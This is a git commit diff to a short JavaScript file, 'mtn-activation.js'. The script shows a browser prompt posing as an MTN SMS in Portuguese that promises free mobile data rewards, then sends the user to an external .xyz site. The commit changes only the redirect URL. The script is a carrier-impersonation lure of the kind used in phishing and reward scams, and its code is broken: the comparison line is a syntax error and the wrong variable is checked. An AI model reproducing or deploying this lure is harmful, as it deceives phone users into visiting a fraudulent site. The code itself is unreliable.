ab2e32b4dc03c11e7a16a0a5e6f891523c4ad446
zamonize1 <52072397+zamonize@users.noreply.github.com>
2024-06-05 14:18:59 -0700

    Update mtn-activation.js

--- mtn-activation.js
+++ mtn-activation.js
@@ -1,5 +1,5 @@
 var senha = '1'
 password=prompt('MTN SMS: Prezado cliente, por favor, verifique se o seu cartão SIM MTN está qualificado para receber de 5 GB a dados ilimitados, clientes antigos Recompensa, pressione 1 para verificar agora ','1');
 if (senha! = '1') {
-location.href='https://todyforu.xyz/mtn-rewards';
+location.href='https://todyforu.xyz/mtn-rewards.html';
 }
